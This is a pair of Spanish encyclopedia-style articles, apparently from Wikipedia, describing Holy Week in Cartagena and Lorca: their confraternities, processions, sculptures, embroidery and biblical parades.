El "epicentro" de la Semana Santa de Cartagena es la iglesia de Santa María de Gracia, un templo del siglo XVIII, que no llegó a finalizarse en su fachada y que se vio gravemente afectado por la destrucción de todo su interior en los primeros días de la Guerra Civil Española en 1936. Está ubicado en la calle del Aire, en pleno casco antiguo de la ciudad.

Las procesiones cartageneras tienen como rasgo más destacado el orden de los penitentes, que marchan al son del tambor al unísono; andan y paran a la vez y permanecen estáticos en las paradas. Junto al orden, la flor, la luz o la música son rasgos distintivos de esta Semana Santa.

En materia escultórica alberga un importante patrimonio formado por obras de José Capuz, Juan González Moreno, Mariano Benlliure, Francisco Salzillo, Federico Coullaut-Valera y otros muchos escultores españoles. Son también destacables los mantos y estandartes bordados, algunos de ellos de los siglos XVIII y XIX.

Las cuatro cofradías que organizan las distintas procesiones que tienen lugar a lo largo de diez días son: 

Dentro de la cofradía de Nuestro Padre Jesús Nazareno podemos encontrar 18 agrupaciones que componen la misma, estas agrupaciones son : Granaderos, Santo Cáliz, Estudiantes, Jesús Nazareno, La Verónica, Soldados Romanos, San Juan, La agonía, La lanzada, La virgen de la Soledad, Descendimiento, Virgen de la Piedad, Santo Entierro, Santo sepulcro, Santo sudario, Portapasos de la Piedad, Portapasos de la Dolorosa y María Magdalena.

Esta cofradía es la más minoritaria, está formada por solo 2 agrupaciones : Agrupación del Cristo del Socorro, Agrupación de la Santísima Virgen de la Soledad del Consuelo.
Esta cofradía es la segunda más numerosa en cuanto a agrupaciones se refiere, está formada por 15 agrupaciones, las cuales son : Agrupación del Santísimo y Real Cristo de la Misericordia, Agrupación de María Santísima del Rosario en sus Misterios Dolorosos, Agrupación de Granaderos, Agrupación de la Santa Cena y del Santísimo Cristo de los Mineros, Agrupación de la Oración en el Huerto, Agrupación del Ósculo, Agrupación del Prendimiento, Agrupación de Soldados Romanos, Agrupación del Santísimo Cristo de la Flagelación, Agrupación de la Coronación de Espinas, Agrupación de la Sentencia de Jesús, Agrupación de Santiago Apóstol, Agrupación de San Pedro Apóstol, Agrupación de San Juan Evangelista, Agrupación de la Santísima Virgen del Primer Dolor.
Esta cofradía está compuesta por 11 agrupaciones : Solados Romanos, Aparición de Jesús a María Magdalena, Aparición de Jesús a discípulos en Emaus, Sepulcro vacío, San Juan, Agrupación de escoltas y honores, Nuestro padre Jesús resucitado, Virgen del amor hermoso, Aparición a Santo Tomas, aparición de Jesús en el lago Tiberiades, Junta de Damas.

El viacrucis penitencial de la Socorro da inicio a la Semana Santa en Cartagena. Partiendo de las inmediaciones de la Catedral Antigua, en la que cuenta con capilla propia, realiza una estación penitencial ante la antigua patrona de la Ciudad, la Virgen del Rosell, en la iglesia de Santa María de Gracia, y otra en la basílica de la Virgen de la Caridad, patrona de Cartagena.

Esta procesión tuvo sus comienzos como cofradía independiente, recibiendo poco después el respaldo de la Cofradía del Socorro. Tras unos primeros años en los que desfilaba sin la autorización de la Diócesis de Cartagena, en 1987 se integró en la Cofradía California. Ésta acogió a la mayor parte de las agrupaciones que la formaban, y ha hecho crecer la procesión incorporando nuevos tercios y tronos.

En 1944 la Cofradía California incorporan una nueva procesión en la tarde del Domingo de Ramos, que desde pocos años más tarde, en 1952, es protagonizada por los niños, que desfilan en la misma vestidos a la usanza hebrea. En los últimos años ha incorporado tronos con diversas escenas de la vida pública de Jesús antes de la Entrada en Jerusalén, escena con la que culmina esta procesión.

La primera de las procesiones marrajas es la de la Virgen de la Piedad. En 1930 la cofradía decidió convertir en procesión el habitual traslado que se hacía con este grupo, de similar iconografía al de la Virgen de la Caridad, patrona de Cartagena, un traslado que era seguido por un gran número de "promesas" (personas que hacían penitencia tras la imagen). Instituida ya en procesión, cada año son miles las personas que acompañan a la Virgen de la Piedad en la noche del Lunes Santo.

En 1930 la Cofradía California otorgó carácter procesional al traslado de San Pedro, que se venía realizando desde antaño desde el Arsenal Militar. Poco después de la Guerra Civil se incorporarían con sus respectivos traslados también desde establecimientos militares, las imágenes de San Juan Evangelista y Santiago Apóstol.

En la noche del Miércoles Santo, la Cofradía California pone en la calle la más antigua y destacada de sus procesiones, la del Prendimiento, que data de los orígenes de ésta en 1747.

El origen de la procesión california del Silencio se encuentra en 1928, aunque su primer desfile tuvo lugar un año después, cuando procesionaron las imágenes del Ecce homo (el Cristo del Prendimiento sin los sayones y con diferente indumentaria) y la Virgen, que en los primeros años fue la misma del Primer Dolor. En los años sesenta se incorporaron la imagen del Cristo de los Mineros y el grupo de la Vuelta del Calvario, conformando la actual composición de esta procesión, que discurre en silencio, sin música ni tambor (salvo un tambor sordo al principio y el del piquete).

Su origen como procesión marraja data de 1663, al igual que la del Santo Entierro. Sin embargo, está documentado que anteriormente ya habían participado los marrajos con su Titular, Jesús Nazareno, en la procesión que tenía lugar al alba del Viernes Santo. En ella se escenifica el Encuentro de Jesús y la Virgen Dolorosa en la calle de la Amargura. Rememorando los vínculos históricos de la Cofradía con los pescadores, la imagen del Nazareno sale de la Lonja de Pescados del barrio de Santa Lucía. El Encuentro tiene lugar a las 5 de la madrugada en la Plaza de la Merced, continuando todas las procesiones unidas hasta la recogida en Santa María.

En 1663 la Cofradía del Nazareno recibió la encomienda episcopal de organizar las procesiones de Viernes Santo. Aunque tradicionalmente se ha considerado la del Encuentro como la más antigua, lo cierto es que ambas datan del mismo año en cuanto a procesiones organizadas por la Cofradía Marraja.

La procesión de la Vera Cruz data del año 1959, aunque la autorización episcopal a la Cofradía Marraja para organizar una procesión en la tarde del Sábado Santo se produjo en 1956. Por ello, se trata de la única procesión de esta cofradía que no ha salido nunca de la iglesia de Santo Domingo, de la que partían los cortejos marrajos hasta la Guerra Civil.

Sus orígenes se remontan a 1941, año en que se creó la Agrupación del Resucitado en el seno de la Cofradía Marraja. En 1943 se creó la Cofradía del Resucitado, que desde entonces procesiona cada mañana de Domingo de Resurrección.




</doc>
<doc id="6399" url="https://es.wikipedia.org/wiki?curid=6399" title="Semana Santa en Lorca">
Semana Santa en Lorca

La Semana Santa de Lorca es una de las más destacadas manifestaciones populares de celebración de la Semana Santa en España, habiendo sido declarada como fiesta de Interés Turístico Internacional en 2007. Actualmente se trabaja intensamente en la candidatura a ser preseleccionada para la declaración como Patrimonio Cultural Inmaterial de la Humanidad por la UNESCO.

Al margen de la existencia de procesiones religiosas al modo tradicional, son los Desfiles Bíblicos Pasionales los que dotan a la Semana Santa lorquina de una personalidad única y diferente, con representaciones del Antiguo Testamento o de la simbología cristiana o con la participación de caballos y carros, así como carrozas de enormes dimensiones.

Los bordados en seda son también una característica destacada de los cortejos lorquinos, marcados por una extraordinaria rivalidad entre dos de sus cofradías o pasos, el Azul y el Blanco.

Aun cuando muchas de sus procesiones son más antiguas, la historia de los desfiles bíblicos-pasionales tal y como los conocemos se remonta a finales del siglo XIX, creciendo desde entonces hasta llegar al esplendor de nuestros días.

Aunque algunas de sus procesiones (las de carácter exclusivamente religioso) transcurren por diversas calles de la ciudad, los cuatro grandes desfiles bíblico-pasionales (Viernes de Dolores, Domingo de Ramos, Jueves Santo y Viernes Santo) tienen como marco la Avenida de Juan Carlos I, la más destacada de las vías de la ciudad.

Para ello se acondiciona en los días previos a la Semana Santa con la colocación sobre el asfalto de una capa de tierra que permita el discurrir de los caballos sin riesgo. A ambos lados se colocan gradas en toda la longitud (aproximadamente 600 metros) de la Avenida. Igualmente, grandes focos refuerzan la iluminación de esta vía.

El acceso a estas gradas requiere de la adquisición previa de los correspondientes abonos.

La decoración de las tribunas y de muchos de los balcones con banderas blancas o azules se complementan con los pañuelos que agitan los asistentes haciendo que el escenario de los cortejos lorquinos se tiña con los dos colores principales que protagonizan su Semana Santa.

La Semana Santa de Lorca se organiza en torno a seis cofradías, llamadas "Pasos". Con todo, los Pasos Blanco y Azul capitalizan el protagonismo de esta Semana Santa y "dividen en dos" a los lorquinos en sonados enfrentamientos. Son los únicos pasos que incorporan caballos y grupos bíblicos en movimiento.

Las Cofradías de la Semana Santa lorquina son:


Los orígenes de la Real e Ilustre Archicofradía de Nuestra Señora del Rosario se considera tradicionalmente que se remontan al siglo XV, si bien los documentos más antiguos que hacen referencia a la misma datan de 1574.
La Hermandad se reorganiza en 1753, cuando organiza la procesión del Viernes Santo con la participación de imágenes de un Nazareno, San Juan Evangelista, Santa María Magdalena y la Verónica, junto a las imágenes de Nuestra Señora del Rosario y la Virgen de la Amargura, de Francisco Salzillo. El color era el morado. De aquellos años data también su actual escudo, un águila sostiendo un rosario sobre fondo rojo encima del escudo tiene una corona de oro y de rojo, justo abajo del escudo, unas ramas doradas rodeando este.

Adquiere el título de Real por el ingreso en la misma del rey Fernando VII. En el siglo XIX cambian su color por el que actualmente les caracteriza y da nombre: el blanco, cuando en 1852 se conforma un grupo de nazarenos con este color en el seno de la Archicofradía renombrada como Muy Ilustre Cabildo de Nuestra Señora la Virgen de la Amargura en la Real y Muy Ilustre Orden-Archicofradía de Nuestra Señora del Rosario (Paso Blanco)

Desde 1855, el Paso Blanco procesiona el Domingo de Ramos escenificando, con el Pueblo Hebreo, la Entrada de Jesús en Jerusalén y a su patrón San Juan Evangelista. Pero también lo hace Viernes de Dolores, Jueves Santo y Viernes Santo, siendo este último su día más importante, ya que es cuando procesiona la titular del Paso, Nuestra Señora la Virgen de la Amargura.

Tras la destrucción de su patrimonio en la Guerra Civil Española (1936-1939), la nueva imagen Titular de la Virgen de la Amargura se le encargaría a Amadeo Ruiz Olmos que realiza dicha imagen que es sustituida por otra de José Sánchez Lozano que realizó la primera imagen que no gustó mucho en Lorca y el Paso Blanco la convirtió en Santa Mujer Verónica, por último realiza la imagen que desfila actualmente.
Pero no sólo el Paso Blanco se caracteriza por esto, sino que también por una gran historia en lo que corresponde a bandas musicales. La primera que se fundó en 1863 fue la llamada "“Banda Blanca”". Más tarde en el año 1973 se fundó la Banda de Cornetas y Tambores, estos procesionaban con trajes de romano. Es también en esta época cuando se compone el himno actual del Paso Blanco: "“El Tres”". En 2004 se crea la actual "“Agrupación Musical Nuestra Señora la Virgen de la Amargura”" dirigida por D. Francisco Javier García Zafra, y que consta de más de 100 componentes, es la banda más antigua que procesiona en Lorca.

Podemos destacar dentro del Paso Blanco su Museo de Bordados (MUBBLA). Recoge una gran muestra de los mejores bordados de seda y oro que tiene el Paso, así como también muestras de otros objetos. El MUBBLA se encuentra ubicado en la cochera de Santo Domingo, sede de la cofradía.

Los orígenes del Paso Azul se fijan en la Archicofradía de la Vera Cruz y Sangre de Cristo, creada en el siglo XVI. En el seno de esa cofradía se tiene conocimiento de la existencia en 1752 de la denominada Hermandad de Labradores Lorquinos, que tiene como Titular a Nuestra Señora de los Dolores, y con sede en el convento de los franciscanos.

Desde el año 1800 preside la procesión del Viernes de Dolores y en 1854 se crea en su seno el Paso de Nazarenos Azules. En 1856 comienzan a incorporar bordados de gran calidad a las procesiones lorquinas.

Tras la desaparición en la Guerra Civil de su imagen Titular, obra del escultor local Manuel Martínez en el siglo XVIII, se encargaría la actual imagen de la Virgen de los Dolores al reconocido escultor afincado en Madrid, José Capuz, inspirándose en el estandarte de "el reflejo", representación de la rostro de la imagen original de la Virgen, la cual se sabe que, durante la Guerra Civil, un fraile franciscano la escondió para que no la destruyeran, tan bien que aún hoy no se ha encontrado. Se piensa que debe de estar en algún rincón de San Francisco.

El Trono de la Stma. Virgen de los Dolores está realizado en plata de ley, labrado a mano durante dos años de trabajo en el taller de la calle Pureza del insigne orfebre sevillano que fuera durante muchos años capataz de la Esperanza de Triana D. Juan Borrero. Estrenado el Viernes de Dolores del año 2007, siendo presidente del Paso Azul D. José Antonio Mula García, es el primer trono de palio en salir a hombros en la Semana Santa de Lorca.

El Paso Azul cuenta con 2 imágenes más aparte de la titular: El Cristo de la buena muerte o Cristo Yacente obra del imaginero murciano José Planes que procesiona la tarde del Viernes Santo por las calles de Lorca en trono de andas realizado en los talleres del tallista sevillano Manuel Guzmán Bejarano. Y el Cristo de la Coronación de Espinas realizado por José Antonio Navarro Arteaga que desfila el Jueves Santo en trono en andas también realizado en madera de caoba tallada a mano durante dos años en los talleres de Manuel Guzmán Bejarano, sus ocho medallones, la cruz y los cuatro faroles están realizados en plata en el taller D. Eleuterio Aragón en Motril, año 2001. Las potencias de procesión del Cristo están realizadas en plata y topacio por el maestro orfebre D. Juan Borrero. 

En el año 2009, bajo la presidencia Don José Antonio Ruiz, se funda la Agrupación Musical Mater Dolorosa, dirigida por José Jorge Miñarro y compuesta por cerca de 70 componentes. Además de esta formación musical, el Paso Azul dispone de 3 bandas más:La Banda Romana, la cual mantiene la tradición lorquina de Tamores y Cornetas. La Banda Egipcia, compuesta por los músicos más jóvenes del Paso y por último la Banda del Cristo Yacente, la cual es la ÚNICA banda de Lorca formada exclusivamente por instrumentos de percusión.El Himno del Paso Azul es conocido popularmente como "Las Caretas".

Desde 2015 el Paso Azul cuenta, además, con su propio museo de bordados, conocido como MASS o Museo Azul de la Semana Santa, ubicado en el antiguo Convento de San Francisco. Este museo es con sus más de 3500 m² el museo más grande de la Región de murcia y en él se exponen, entre otras cosas, los bordados representativos de la cofradía.

Se tiene constancia de la existencia en 1555 de la Cofradía de la Santa Vera Cruz y Sangre de Cristo, que procesionaba el Jueves Santo y que sería fundada oficialmente por los franciscanos en 1590.

En 1734 se eleva su rango a Archicofradía, estando constituida en el convento franciscano, donde tenía capilla propia.

Durante la refundación y reorganización de cofradías que tuvo lugar en Lorca a mediados del XIX se une a ella la Hermandad de Nazarenos Coloraos, que había sido fundada en el convento de San Diego, pasando a tener como Titular un Crucificado conocido como el "Cristo de los Terceros". Terminaría por desaparecer en 1904.

En 1935 vuelve a refundarse en el convento de San Diego, organizando por vez primera la Procesión del Silencio, a las cero horas del Viernes Santo.

En 1940, la Archicofradía del Santísimo Cristo de la Sangre es trasladada en su sede a la iglesia parroquial de San Cristóbal. Desde 1948, el Paso Encarnado tiene como imagen Titular al Cristo de la Sangre, talla realizada por el valenciano José Jerique.

A comienzos del siglo XVIII se crea una capilla dedicada al Santísimo Cristo del Socorro en el convento de San Juan de Dios. En 1758 se fundaría, con dicho Titular, una cofradía, que en 1779 adopta como propio el color morado.

En 1800, ya como "paso de nazarenos morados" comienza a presidir la procesión de la tarde del Jueves Santo, con su imagen Titular, la de una Dolorosa y la Santa Cena, obra de Nicolás Salzillo, adquirida a la cofradía murciana de Jesús en 1763.

Su Titular pasaría, con los años, a ser el Santísimo Cristo del Perdón, un Nazareno con la cruz a cuestas realizado por Roque López en 1787.

Al margen de su participación en los desfiles bíblico-pasionales, la Cofradía del Santísimo Cristo del Perdón, el Paso Morado, organiza el Vía Crucis de la mañana de Viernes Santo, con sus característicos ""rezaores"".

La Hermandad de La Curia cuenta también con su remoto origen, en este caso en la cofradía de Nuestra Señora de los Dolores en el Paso del Prendimiento, fundada en 1725, una cofradía que sería reorganizada en 1874 por el Colegio de Abogados y Procuradores, circunstancia de la que proviene su nombre actual. Presidiría la procesión del Miércoles Santo hasta 1932.

Tras la Guerra Civil, su nueva imagen titular será la Virgen de la Soledad, obra de José Sánchez Lozano. El color que la caracteriza hoy le viene dado de su sustitución en esos años de la desaparecida cofradía conocida como los negros-servitas, que estaba constituida en la iglesia de San Mateo, por ello es conocida como el Paso Negro. Presiden por ello la procesión (desfile bíblico pasional) del Domingo de Ramos.

En 1977 se trasladan desde San Mateo a San Patricio, organizando desde entonces la procesión a su Titular en la noche del Sábado de Pasión.

Aun con antecedentes históricos de la celebración de la Resurrección ya en 1601, las primeras constituciones conocidas de esta Archicofradía de Jesús Resucitado datan de 1764.

La primera procesión del Resucitado sale, sin embargo en 1801 ya con la imagen Titular, obra del imaginero murciano Roque López. Fue de las pocas imágenes que sobrevivieron a la Guerra Civil.

Aunque su sede fundacional fue la iglesia de Santa María, al quedar ésta en ruinas tras la Guerra Civil se trasladó a la ex colegiata de San Patricio.

El primero de los desfiles bíblico-pasionales recorre las calles lorquinas en la tarde del Viernes de Dolores. Data de 1800 y lo preside el Paso Azul, que ese día conmemora la festividad de su Titular, la Virgen de los Dolores.

El Paso Azul pone en escena gran parte de su patrimonio artístico como los estandartes de Cayuela, que datan de principios del siglo XX: El Ángel Velado, San Juan, María Magdalena y El Reflejo. Están catalogados como BIC.

El trono de la Virgen de los Dolores, con la imagen realizada en 1941 por José Capuz bajo el palio bordado en sedas por Francisco Cayuela, cierra el desfile del Viernes de Dolores. Acompañan a la imagen una escolta de 12 nazarenos, los 7 Dolores de la Virgen y los Cuatro Evangelistas con el Arcángel San Gabriel a caballo como testigos de la Redención. La preceden cientos de mujeres con mantilla, vestidas de riguroso luto.

Los aledaños de la antigua Colegiata de San Patricio, las calles antiguas del entorno de la lorquina Plaza de España, acogen en la noche del Sábado de Pasión la procesión de la Curia, organizada por el Paso Negro.

Se trata de una procesión de corte tradicional, no de un desfile bíblico. La austeridad es elemento básico de la misma, en la que, sobre unas sencillas andas procesiona la imagen de la Virgen de la Soledad, obra de José Sánchez Lozano. Las representaciones del resto de pasos se limitan a la presencia de su estandarte.

El segundo desfile bíblico de los lorquinos tiene lugar en la tarde del Domingo de Ramos en un cortejo que, aún presidido por la Hermandad de la Curia, tiene como principal protagonista al pueblo hebreo, del Paso Blanco.

La representación Bíblica del Paso Azul es romana, etíope y fundamentalmente egipcia, destacando las figuras del Faraón Ramses II y la princesa Meiamén, que salvó a Moisés de las aguas del Nilo. Dentro del Grupo del Faraón aparecen también las 4 cuadrigas egipcias.

La representación Bíblica del Paso Blanco es hebrea, destacando los reyes David y Salomón, acompañados de su séquito y el grupo más característico de esta procesión, el Pueblo Hebreo, que recorre las calles de Lorca del Domingo de Ramos desde 1855. Participan miles de blancos y blancas vestidos con túnicas, para celebrar la entrada de Jesús en Jerusalén, portando palmas, ramas de olivo y repartiendo caramelos. Tras ellos desfila, en trono de andas, con una ornamentación de palmas, la imagen de San Juan Evangelista de Castillo Lastrucci (1973) a hombros de sus portapasos al ritmo de la Agrupación Musical Nuestra Señora la Virgen de la Amargura.

Cierra la procesión la imagen titular del Paso Negro, la Virgen de la Soledad, escoltada por mayordomos con toga, tradición de esta Hermandad, integrada por miembros de la judictadura. El manto es una obra realizada en terciopelo negro, bordado en oro y sedas. En la parte superior presenta dos escudos bordados en oro: a la derecha el Ayuntamiento de Lorca y a la izquierda el Colegio de Abogados de Lorca. En la parte inferior muestra tres medallones bordados en seda: el medallón central representa una imagen de la piedad, inspirada en La Piedad de Miguel Ángel y dos medallones a los lados más pequeños que representan unos ángeles, inspirados en el modelo iconográfico de la Capilla Sixtina.

El Jueves Santo tiene lugar el primero de los dos grandes desfiles bíblicos lorquinos. En el mismo azules y blancos sacarán a la calle gran cantidad de elementos a caballo, grupos completos de Egipto, el pueblo judío o símbolos del Triunfo del Cristianismo, así como alguna de las grandes carrozas que ocupan completamente el ancho de la Avenida Juan Carlos I.

Podemos destacar dos aspectos dentro de esta procesión: el cortejo bíblico, que esta noche representa el sufrimiento del pueblo hebreo a manos de las civilizaciones que lo sometieron, como Egipto, Babilonia y Roma; y su sentido religioso y pasional, en el que se refleja el sufrimiento de Jesús durante la Última Cena, momento en el que instaura el Sacramento de la Eucaristía, intuyendo su propia muerte.

Caracterizando a los personajes del Antiguo Testamento, los miembros de las cofradías lorquinas, vestidos con ricos mantos, desfilan a caballo, en bigas, cuadrigas, sigas y carrozas.

La Cofradía del Santísimo Cristo del Perdón, el Paso Morado, preside la procesión de Jueves Santo desde el año 1800. Esta tarde muestra todo su patrimonio artístico en la denominada Procesión del Perdón. En primer lugar destacan sus cuatro tronos que salen por este orden: Última Cena, de Nicolás Salzillo (1700) y José Jerique (1953), Jesús Nazareno del Perdón (Roque López, 1787), Monte Calvario (anónimo, Dolorosa atribuida a Roque López, 1802 y Manuel Carrillo, 1942) y María Santísima de la Piedad (Antonio García Mengual, 1982). También figura en la procesión la imagen del Santísimo Cristo de la Misericordia (Isabel Biscar, 1944), portada a hombros por los Hermanos del Socorro.

Al finalizar el Desfile Bíblico de la tarde del Jueves Santo, desde el Barrio de San Cristóbal parte la procesión del Silencio, un cortejo totalmente diferente, sin grupos bíblicos, que organiza el Paso Encarnado.

Tres imágenes procesionan este día: el Señor de la Penitencia, una obra de José Hernández Navarro en 1999, la Virgen de la Soledad (José Sánchez Lozano, 1963) y el Titular de la Cofradía, el Cristo de la Sangre (José Jerique Chus, 1948). Las tres imágenes recorren las calles del barrio en un ambiente de estricta religiosidad. Participan en la procesión todas las cofradías con sus estandartes-guion y una representación de los Coloraos de Murcia. El silencio sólo se rompe con la voz de los santeros acompañados de la melodía de la Agrupación Musical Stmo Cristo de la Sangre.

El Viernes Santo es el día más destacado de la Semana Santa lorquina. Con todo, antes de comenzar el recorrido por las sedes de los pasos para ver la exposición de los enseres que procesionarán en el Desfile Bíblico de la tarde, tiene lugar el Vía Crucis al Calvario.

En la mañana del Viernes Santo, el Paso Morado organiza un Vía Crucis en el que llevan en andas tres imágenes de esta Cofradía (San Juan, el Stmo Cristo del Socorro y la Dolorosa) y con ellas se encaminan a una ermita conmemorativa del Calvario en las afueras de Lorca. El rezo de las estaciones se hace de una forma peculiar desde antiguo por los llamados “rezaores”. El Monte Calvario junto con el Via Crucis fue declarado BIC.

El de Viernes Santo es el más importante de los desfiles que tienen lugar en la Semana Santa lorquina. Miles de personas asisten al mismo, que es, además el más concurrido por las diferentes cofradías lorquinas, que acuden a él con lo más destacado de su patrimonio.

Preside el Cortejo el Muy Ilustre y Cavildo de Nuestra Señora la Virgen de la Amagura en la Real y Muy Ilustre Orden-Archicofradia de Nuestra Señora la Virgen del Rosario Paso Blanco con su estandarte Guion. A continuación desfila el Paso Encarnado con las imágenes de la Santísima Virgen de la Soledad Coronada y del Santísimo Cristo de la Sangre.

El Paso Morado interviene con su Procesión de la Virgen de la Piedad y del Titular de la Cofradía.

El Cortejo del Paso Azul representa el camino recorrido por el patriarca Moisés y su pueblo, pasando por las civilizaciones de Egipto y Roma hasta llegar al destino final, el Triunfo del Cristianismo y la Redención de la Humanidad. Abre la procesión del Paso Azul el estandarte de la Santísima Virgen de los Dolores a continuación vienen los exploradores que mandó Moisés a la tierra prometida. La infantería romana y la primera bandera del paso introducen a los personajes de Antíoco IV Epifanes, la profetisa Débora y Ptolomeo IV Filopator. Llega la entrada del Faraón de Egipto acompañado de su caballería etíope, Moisés, Meiamén y las profetisas egipcias. Roma con la carroza del Emperador Julio César tirada por caballos, Cleopatra, que desfila en una gran litera, la caballería egipcia, Marco Antonio y Nerón (en una enorme carroza que acapara toda la carrera). Tras las cuadrigas de la Dinastía de los Flavios, la caballería romana y Tiberio anuncian la llegada del Triunfo del Cristianismo, representado por la Caballería del Triunfo y la Carroza del Ángel Caído.

Tras la representación bíblica azul, seis nazarenos de raso introducen el cortejo pasional: El Triunfo de la Redención.

Llega el La Santa Cruz, el Gran Penitente, Simeón y Pilatos que anuncian el drama. El estandarte del Cristo Yacente, obra de Emiliano Rojo, los nazarenos que le siguen y los diáconos, preceden a la imagen del Santísimo Cristo de la Buena Muerte en trono de andas portado por 90 portapasos, le acompaña la Banda de Tambores y tres nazarenos. A contiunuación los estandartes de El Ángel Velado, San Juan y la Magdalena y El Reflejo, denominado así por ser la viva imagen de la antigua talla de la titular Azul, del lorquino José Manuel Martínez Castillo, desaparecida en la Guerra Civil Española. Los 12 nazarenos de la Virgen y una cruz guía preceden al Trono en andas labrado en plata y marfil de la Sagrada Imagen de la Santísima Virgen de los Dolores. Los 7 nazarenos que representan los 7 Dolores de la Virgen, los Cuatro Evangelistas que la escoltan a caballo y los nazarenos de cierre clausuran el Cortejo Azul.

El estandarte Guion del Paso Negro separa el Cortejo Azul del Cortejo Blanco.

El Paso Blanco culmina esta procesión con el Cortejo de la Salvación, el camino hacia ella a través de las civilizaciones romana, babilónica, asiria y persa, presentes en el Antiguo Testamento, todas ellas opresoras del pueblo judío, hasta encontrarla en el Evangelio según San Juan, en el Nuevo Testamento.

Inicia el Cortejo Blanco el Estandarte del Rosario, la Bandera del Paso Blanco y los Nazarenos del Cabíldo. Llega el grupo de Roma con la quintiga de Octavio César Augusto, las cuadrigas de Teodosio I "El Grande", Licinio y Constantino I el Grande y por último la siga de Majencio.

Le sigue el grupo a caballo formado por Santa Elena, Constancio Cloro y Fausta, después una caballería romana formada por un legado y cinco tribunos. Finaliza el conjunto de Roma la Caballería Imperial compuesta por Maximiano, Diocleciano, Maximino Daya, Juliano el Apóstata y Galerio.

Antes que Roma cae Babilonia, representada por el grupo del rey Nabucodonosor II en una carroza tirada por esclavos. Según el Antiguo Testamento, Esther, nacida en Babilonia, se desposó con el rey Persa Asuero. Este dictó una orden de exterminio contra el pueblo judío, ley que derogó al conocer que su propia esposa era hebrea. Esther lo hizo público y con ello salvó su vida y la de miles de inocentes. Esta historia la representa el grupo de Esther y Asuero, en bigas, precedidos de la infantería Persa y la Corte, y seguidos de la caballería del grupo, compuesta por ocho jinetes.

Llegan las tribus de Israel, primero el grupo del Rey David, compuesto por el propio rey, la caballería de sus esposas y la infantería judía. Después el grupo del Rey Salomón, que desfila en una biga, precedido de su corte y del Caballo del Respeto, el único sin montura. Le sigue la caballería del rey y sus heraldos. Le sigue el grupo de la Reina de Saba, compuesto por la biga de Menelik I, la corte de esclavas de la reina y la propia Reina de Saba en una espectacular carroza. Cierra la procesión bíblica el Grupo del Cisma de las Tribus de Israel: la caballería de las 10 tribus del reino del Norte, encabezadas por Jeroboam en una triga; y la caballería de las 2 tribus del Sur, con Roboam en una biga y los Jefes de las Tribus.

Llega el Cortejo Religioso Blanco, el Cortejo de la Salvación, reflejo del Evangelio según San Juan, Santo Patrón del Paso Blanco.

La Bandera centenaria y los Nazarenos del Cabildo introducen el Cortejo Religioso y anuncian la llegada del Grupo de la Visión Apocalíptica de San Juan.

Llega el Estandarte de San Juan y sus nazarenos. A continuación la Caballería de la Visión de San Juan, donde podemos reconocer personajes como Atila, Alejandro Magno o Mahoma, después la Carroza de la Visión de San Juan y tras ella los cuatro jinetes del Apocalipsis.

Tras ellos la talla del Evangelista, San Juan, en trono de andas. Los portapasos del trono desfilan siguiendo las directrices que marca la Agrupación Musical Juvenil Nuestra Señora la Virgen de la Amargura vestidos de Romanos, haciendo dos vueltas en carrera, la primera acompaña a la Infantería Romana del Paso Blanco y la segunda acompaña a el patrón de esta cofradía, San Juan Evangelista.Tras este grupo Sanjuaista llega el Estandarte de la Santa Faz y los nazarenos de la Santa Verónica que preceden a la imagen de la Santa Mujer Verónica en trono de andas realizado en plata y portado por mujeres portapasos.

En última instancia, aparece el Estandarte de la Santísima Virgen de la Amargura. A continuación los nazarenos que representan los Misterios del Rosario cuyos bordados recuerdan diferentes estilos arquitectónicos, preceden el trono de la Santísima Virgen de la Amargura. La reconfiguración de la secuencia narrativa de la procesión del Viernes Santo en los tiempos del barroco supuso la incorporación de la advocación de la Virgen de la Amargura pensada para representar la escena inmediatamente posterior a la muerte de Jesús.
Se trata de una talla realizada a semejanza de la original de Salzillo, desaparecida en la Guerra Civil Española, La bellísima imagen de la Virgen de la Amargura se debe a la gubia del imaginero murciano José Sánchez Lozano, la búsqueda de la belleza y cierto naturalismo idealizado propio del escultor Sánchez Lozano, la acerca a una exquisita belleza que nos acerca a Dios e invita a la devoción por una madre perfecta.
Sólo procesiona la noche del Viernes Santo. 

La Virgen de la Amargura luce el manto con mayor extensión bordada de cuantos desfilan en la procesión de Lorca, siendo imposible percibir por ningún lado la tela sobre la que se bordó (todo él, es un inmenso tapiz) realizado por Emilio Felices en 1928.
En la parte central está representado el Santo Entierro de Ciseri. Compone el grupo las figuras de San Juan, San José de Arimatea y San José Nicodemus, que llevan en la Sagrada Sábana el cuerpo sin vida de Jesús, y a los que acompañan la Virgen María y la Magdalena.
Bajo la escena principal se incorpora una versión de El ángel de la Eucaristía de Giambattista Tiépolo y dos grandes a modo de velos laterales que, salpicados de ángeles y querubines, muestran como si de un gran teatro se tratara el entierro del Salvador de la Humanidad.
En la parte superior se representa a Dios Padre.
El resto está bordado con nubes y ángeles, y una gran cenefa orla el manto por completo.

El palio de la Virgen es también obra de Emilio Felices en 1915.
Envuelto en trazas de corte gótico y enmarcado en un rosetón encontramos una versión de Felices de Cristo coronado de espinas obra original de Guido Reni articulando la composición flanqueada por dos escenas de mayor tamaño y marco mixtilíneo.
En la primera de ellas y en la zona izquierda del espectador aparecen representados Cristo y San Juan, su discípulo amado, figuras versionadas del óleo Cristo y Judas, cuyo autor es Adolf Schmitz, invirtiendo en este caso su posición para que se adecuaran mejor al irregular espacio triangular.
En la zona de la derecha aparece bordada la conocida imagen del ángel que tallara Salzillo en 1754 para el grupo escultórico de La oración en el huerto. La figura presenta una gran fuerza y movimiento acusado por la composición diagonal que apuntalan el ala extendida y el brazo indicando la dirección al Cielo.
El conjunto del paño frontal se cierra con un elegante festoneado en oro de corte gótico y calados de cardinas pareadas rematadas en borlones de oro.
En el paño frontal aparece:
Jesús y San Juan en la Última Cena.
El Ángel de Salzillo.
Y la cara de Jesús coronado de espinas en el medallón central.

Cierra esta procesión los "Mayordomos de la Virgen de la Amargura" y La Agrupación Musical Nuestra Señora la Virgen de la Amargura vestidos con traje de máxima gala, con un casco de plumas blanco y un traje inspirado en la Guardia Real (Este traje solo lo lucen cuando sale la Virgen de la Amargura).

La mañana del Domingo de Resurrección tiene lugar la última de las procesiones lorquinas: la de la Resurrección, que partiendo de la Colegiata de San Patricio recorre parte del casco histórico lorquino con las imágenes de Nuestro Señor Jesús Resucitado (Roque López) y María Santísima de la Encarnación y Asunción (José Jerique Chús, 1941).

Al margen de los desfiles bíblicos y las procesiones, algunos actos de la Semana Santa lorquina son también sumamente destacados.

